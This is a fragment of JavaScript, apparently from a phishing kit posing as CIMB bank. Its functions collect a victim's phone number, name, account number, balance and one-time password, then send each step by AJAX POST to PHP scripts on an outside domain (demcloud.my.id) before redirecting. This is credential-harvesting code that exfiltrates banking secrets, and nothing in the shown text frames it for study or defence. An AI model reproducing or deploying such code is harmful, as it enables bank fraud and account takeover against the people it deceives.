...
function sendNohp(){    
  ...
  sessionStorage.setItem('nomor', nomor);                     
       ...
       $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/gft8a/no.php',
...
function sendLogin(){
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
     ...
     $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/gft8a/login.php',
...
function sendSaldo(){
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo) {      
       ...
       $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/gft8a/saldo.php',
...
function sendOtp(){
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
     ...
     $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/gft8a/otp.php',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/cimb/gft8a/wa';
    }, 00);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 00);      
